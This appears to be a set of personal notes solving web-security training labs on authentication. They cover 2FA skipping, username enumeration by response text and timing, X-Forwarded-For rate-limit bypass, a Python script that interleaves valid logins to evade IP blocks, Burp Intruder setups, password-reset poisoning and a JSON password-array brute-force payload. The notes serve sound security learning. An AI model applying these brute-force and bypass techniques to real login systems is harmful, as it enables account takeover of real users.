# Lab: 2FA simple bypass

Stop the Enter 2FA code and go straight to the `/my-account` page

# Lab: Username enumeration via subtly different responses

Message on wrong username: `Invalid username or password.`

Message on wrong password: `Invalid username or password`

Without a dot.

# Lab: Username enumeration via response timing

Send login request to Intruder.

Run a test, we can see that was rate limited.

Bypass by using the Header: `X-Forwarded-For`

Set the username with the list, and a mass long password.

After finish, check the response time and got the right username.

```HTTP
X-Forwarded-For: 85
Connection: keep-alive
username=arkansas&password=peteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaapeteraaaaaaaaaaaaaaaaaaa
```

# Lab: Broken brute-force protection, IP block

It block your IP if you send from 3 login attempt/minute.

But if we just send only 2 login attempt and then send a success login then we could bypass the protection.

And set the config to only send 1 req/time

A simple script for generate the payload list

```python
#!/usr/bin/python3

password = """123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
"""

right_credentials = ("wiener", "peter")
victim_username = "carlos"

print("##################### Username list #####################")
for i in range(150):
    if i % 3 == 0:
        print(right_credentials[0].strip())
    else:
        print(victim_username)

print("##################### Password list #####################")
line = 0
for password in password.split("\n"):
    if line % 3 == 0:
        print(right_credentials[1].strip())
        print(password.strip())
        line += 1
    else:
        print(password.strip())    
    line += 1
```

# Lab: Username enumeration via account lock

This lab simulator that the system only block/lock the IP if it detect that it have a brute foce for a EXIST user account.

Then we try to enumerate the username by send multiple login requests for an username

Perform on Burp Suite by:

- Select **Cluster bomb attack**
- Set the payload 1 to the username and load the payload list
- Add another empty payload by add `§§` to the end of the body. Like:

```
username=§invalid-username§&password=example§§
```

- Select the Payload type `Null payloads` for the `2`- as known as the empty payload and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times.
- We got the username with a rate limit message
- Try to brute force the password, we got limited but on the right username/password, it login successfully without any message.

# Lab: Password reset poisoning via middleware

Server use the `Host`/`X-Forwarded-Host` to generate the reset password link.

So we add the header `X-Forwarded-Host` and send a reset password request to the user `carlos` then the user access the link point to own server, we got the token to reset the password for this user.

# Lab: Password brute-force via password change

In this lab, the change password function is vulnerable, username passed into post body without validation.

On password change request, if you enter two different new passwords, an error message simply states`Current password is incorrect`. If you enter a valid current password, but two different new passwords, the message says`New passwords do not match`. We can use this message to enumerate correct passwords.

# Lab: Broken brute-force protection, multiple credentials per request

Request send a JSON credential

```json
{"username":"carlos","password":"123"}
```

Change the password into a list:

```json
{"username":"carlos","password":["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]}
```

